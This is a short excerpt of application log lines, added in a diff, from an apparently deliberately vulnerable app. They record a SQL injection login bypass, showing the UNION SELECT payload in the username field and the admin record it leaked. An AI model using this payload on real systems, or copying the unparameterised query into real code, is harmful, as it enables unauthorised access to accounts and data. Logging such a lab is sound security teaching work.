+2026-03-13 16:45:23,841 - app.routers - WARNING - [SQLI RESULT] Data leaked: {'id': 1, 'username': 'admindangcode'}
+2026-03-13 16:46:20,471 - app.routers - WARNING - [VULNERABLE] Executing query: SELECT id, username FROM Admins WHERE username = '' UNION SELECT id, username FROM Admins -- -' AND password = ''
+2026-03-13 16:46:20,473 - app.routers - WARNING - [SQLI RESULT] Data leaked: {'id': 1, 'username': 'admindangcode'}
